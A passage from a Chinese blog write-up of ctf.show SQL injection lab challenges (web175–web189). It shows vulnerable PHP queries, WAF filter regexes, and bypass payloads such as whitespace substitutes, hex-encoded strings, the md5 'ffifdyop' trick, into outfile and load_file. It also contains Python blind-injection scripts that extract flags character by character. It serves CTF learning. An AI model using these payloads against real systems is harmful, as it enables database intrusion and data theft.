        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>

    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>head<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>利用into outfile来实现文件的输出</p>
<pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' union select 1,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/1.txt'+--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="web176——大小写绕过"><a href="#web176——大小写绕过" class="headerlink" title="web176——大小写绕过"></a>web176——大小写绕过</h1><h1 id="web177-179——空格绕过"><a href="#web177-179——空格绕过" class="headerlink" title="web177-179——空格绕过"></a>web177-179——空格绕过</h1><p>除了空格，在代码中可以代替的空白符还有：</p>
<pre><code>%0a
%0b
%0c
%0d
%09
%a0(在特定字符集才能利用)
以上均为URL编码

/**/组合
括号
%23代替注释符 -- </code></pre><h1 id="web180-182——优先级-and-gt-or"><a href="#web180-182——优先级-and-gt-or" class="headerlink" title="web180-182——优先级 and &gt; or"></a>web180-182——<code>优先级 and &gt; or</code></h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>空格利用的是()括号代替的</p>
<p><strong>解题：</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">where username !='flag' and id = ''or(id=26)and'1'='1' limit 1
where (username !='flag' and id = '')or(id=26 and'1'='1') limit 1
因为or的存在，相当于要select两次，但又因为or左边是为0的，右边为id=26，所以只select右边
完整的sql语句变为：select id,username,password from ctfshow_user where id=26 limit 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>关于优先级问题就跟加减号与乘除号一样，and先运算，那么and的运算结果过程如何解释：需要同时满足两边的条件才会返回true，否则不执行啊！那么这里就是让第一个and语句返回false让后面的and语句来做到知行的效果</p>
<p><strong>payload：</strong><code>&#39;or(id=26)and&#39;1&#39;=&#39;1</code></p>
<h1 id="web183——like盲注"><a href="#web183——like盲注" class="headerlink" title="web183——like盲注"></a>web183——like盲注</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select count(pass) from "</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'tableName'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>查询结果</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//返回用户表的记录总数</span>
      <span class="token variable">$user_count</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>解题思路</strong></p>
<pre class="line-numbers language-mysql"><code class="language-mysql">括号代替的是空格
tableName=(ctfshow_user)where(pass)like'ctfshow{%'
% ：在sql中通配 N 个字符
_ ：通配任意一个字符
会发现返回结果  $user_count = 1;代表匹配到了一个，利用此模式盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>python脚本</strong></p>
<p>需要post传参</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/27 12:21</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

url <span class="token operator">=</span> <span class="token string">'http://d4c4cba3-a83d-4957-a3e7-b6d67bd3a89d.challenge.ctf.show:8080/select-waf.php'</span>
letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-{}'</span>
flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">150</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"(ctfshow_user)where(pass)like'{}%'"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> r<span class="token punctuation">:</span>
            flag<span class="token operator">+=</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> j<span class="token operator">==</span><span class="token string">"}"</span><span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="2021-7-27"><a href="#2021-7-27" class="headerlink" title="2021-7-27"></a>2021-7-27</h1><h1 id="web184——利用having代替where进行like盲注"><a href="#web184——利用having代替where进行like盲注" class="headerlink" title="web184——利用having代替where进行like盲注"></a>web184——利用<a href="https://www.runoob.com/sqlite/sqlite-having-clause.html" target="_blank" rel="noopener">having</a>代替where进行like盲注</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>python脚本</strong></p>
<p>利用到了<a href="https://www.runoob.com/mysql/mysql-regexp.html" target="_blank" rel="noopener">mysql中的regexp正则匹配</a></p>
<p><a href="https://www.cnblogs.com/zeroingToOne/p/9575203.html" target="_blank" rel="noopener">MySQL中的内连接、左连接、右连接、全连接、交叉连接</a></p>
<p><a href="https://www.runoob.com/w3cnote/sql-join-the-different-of-on-and-where.html" target="_blank" rel="noopener">SQL JOIN 中 on 与 where 的区别</a>：在此脚本中是用on代替了where</p>
<p>利用having来代替where也是作为一个条件判断子句</p>
<p>利用16进制代替引号</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token shell-comment comment"># -*- coding: utf-8 -*-</span>
<span class="token shell-comment comment"># @Author  : Yn8rt</span>
<span class="token shell-comment comment"># @Time    : 2021/7/27 15:04</span>
<span class="token shell-comment comment"># @Function:</span>
import requests
import sys

url <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//683f40c0-31e4-46a7-bed1-f8eb216b7515.challenge.ctf.show:8080/select-waf.php'</span>
flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>
letter <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-{}"</span>

def <span class="token function">asc2hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    a1 <span class="token operator">=</span> <span class="token string">''</span>
    a2 <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i in s<span class="token punctuation">:</span>
        a1<span class="token operator">+</span><span class="token operator">=</span><span class="token function">hex</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    a2 <span class="token operator">=</span> a1<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> a2
<span class="token keyword">for</span> i in <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j in letter<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">"tableName"</span><span class="token punctuation">:</span><span class="token string">"ctfshow_user group by pass having pass like {}"</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token operator">+</span><span class="token function">asc2hex</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>j<span class="token operator">+</span><span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> in r<span class="token punctuation">:</span>
            flag<span class="token operator">+</span><span class="token operator">=</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
            <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>
                sys<span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web185、186"><a href="#web185、186" class="headerlink" title="web185、186"></a>web185、186</h1><p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//对传入的参数进行了过滤</span>
  <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\'|\"|union|\`|sleep|benchmark/i'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>mysql中的利用字符组合成的数字：</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201127190309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>python脚本：</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/27 21:52</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">createNum</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num <span class="token operator">=</span> <span class="token string">"true"</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"true"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            num <span class="token operator">+=</span> <span class="token string">"+true"</span>
    <span class="token keyword">return</span> num


<span class="token keyword">def</span> <span class="token function">createstrNum</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">:</span>
    _str <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> m<span class="token punctuation">:</span>
        _str <span class="token operator">+=</span> <span class="token string">",chr("</span> <span class="token operator">+</span> createNum<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">")"</span>
    <span class="token keyword">return</span> _str<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>


url <span class="token operator">=</span> <span class="token string">"http://282b6260-a1f9-437d-98f1-a7fb46d977a5.challenge.ctf.show:8080/select-waf.php"</span>
letter <span class="token operator">=</span> <span class="token string">"0123456789abcdefghijklmnopqrstuvwxyz-{}"</span>
flag <span class="token operator">=</span> <span class="token string">"ctfshow{"</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> letter<span class="token punctuation">:</span>
        data <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string">'ctfshow_user group by pass having pass like concat({})'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>createstrNum<span class="token punctuation">(</span>flag <span class="token operator">+</span> j <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token comment" spellcheck="true"># print(res)</span>
        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>
            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="2021-07-28"><a href="#2021-07-28" class="headerlink" title="2021-07-28"></a>2021-07-28</h1><h1 id="web187——md5-pass-true-绕过"><a href="#web187——md5-pass-true-绕过" class="headerlink" title="web187——md5($pass,true)绕过"></a>web187——md5($pass,true)绕过</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select count(*) from ctfshow_user where username = '$username' and password= '$password'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment" spellcheck="true">//只有admin可以获得flag</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token operator">!=</span><span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名不存在'</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意到<code>md5(string,true)</code>这个函数</p>
<p><code>md5(string,raw)</code>其中raw参数可选，且有两种选择</p>
<ul>
<li>FALSE：32位16进制的字符串</li>
<li>TRUE：16位原始二进制格式的字符串</li>
</ul>
<p>当有true这个参数，会以二进制的形式输出16个字符。返回的这个原始二进制不是普通的<code>0 1</code>二进制。</p>
<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210728194838783.png" alt></p>
<p><strong>再看下一个知识点</strong></p>
<p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）</p>
<p><strong>构造payload</strong></p>
<pre><code>$sql = &quot;select count(*) from ctfshow_user where username = &#39;admin&#39; and password= &#39;ffifdyop&#39;&quot;;
$sql = &quot;select count(*) from ctfshow_user where username = &#39;admin&#39; and password= &#39;&#39;or&#39;6�]��!r,��b&#39;&quot;;</code></pre><p><strong>随手写个小脚本啊：</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/28 20:02</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/select-waf.php'</span>
url2 <span class="token operator">=</span> <span class="token string">' http://c523bc8a-a1eb-4c7b-81c2-915c52efa9bb.challenge.ctf.show:8080/api/'</span>

payload <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"ffifdyop"</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">#r = requests.post(url=url,data=payload)</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url2<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text

<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="web188——MySQL中的弱比较"><a href="#web188——MySQL中的弱比较" class="headerlink" title="web188——MySQL中的弱比较"></a>web188——MySQL中的弱比较</h1><p><strong>查询语句</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//拼接sql语句查找指定ID用户</span>
  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select pass from ctfshow_user where username = {$username}"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>返回逻辑</strong></p>
<pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//用户名检测</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\'|\"/i'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'用户名非法'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//密码检测</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'密码只能为数字'</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token comment" spellcheck="true">//密码判断</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'登陆成功'</span><span class="token punctuation">;</span>
      <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>mysql中字母与数字的比较过程：</strong></p>
<p>你可以尝试一下在数据库中使用这样的语句：<br><code>select * from stu where name=0</code>很有可能是能查询出东西的，即使你没有name为0的数据</p>
<p>这是因为数据库进行了弱比较，它<strong>select出所有name是以字母为开头的数据</strong><br>以字母为开头的字符型数据在与数字型比较时，会强制转化为0，再与数字比较（这里很类似于PHP的弱比较）<br>假设我们username为0，那么就会相等，从而匹配成功</p>
<p>在这里的password是用0来混字母开头的<code>$row[&#39;pass&#39;]</code></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/28 20:02</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">'challenge.ctf.show:8080/api/'</span>

payload <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">#"username":"1||1",</span>
    <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"0"</span><span class="token punctuation">,</span>
    <span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"0"</span>
<span class="token punctuation">}</span>

res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>text

<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="2021-7-30"><a href="#2021-7-30" class="headerlink" title="2021-7-30"></a>2021-7-30</h1><h1 id="web189——load-file结合regexp盲注"><a href="#web189——load-file结合regexp盲注" class="headerlink" title="web189——load_file结合regexp盲注"></a>web189——<code>load_file</code>结合<code>regexp</code>盲注</h1><p>hints：flag在api/<strong>index</strong>.php文件中</p>
<p><a href="https://www.cnblogs.com/blacksunny/p/8060028.html" target="_blank" rel="noopener">mysql load_file在数据库注入中使用</a></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
<span class="token comment" spellcheck="true"># @Author  : Yn8rt</span>
<span class="token comment" spellcheck="true"># @Time    : 2021/7/30 15:48</span>
<span class="token comment" spellcheck="true"># @Function:</span>
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> json

url <span class="token operator">=</span> <span class="token string">'http://6ef6bc21-0110-4f40-bb9e-d260d53faac1.challenge.ctf.show:8080/api/index.php'</span>
flag <span class="token operator">=</span> <span class="token string">'ctfshow{'</span>
letter <span class="token operator">=</span> <span class="token string">'0123456789abcdefghijklmnopqrstuvwxyz-{}'</span>

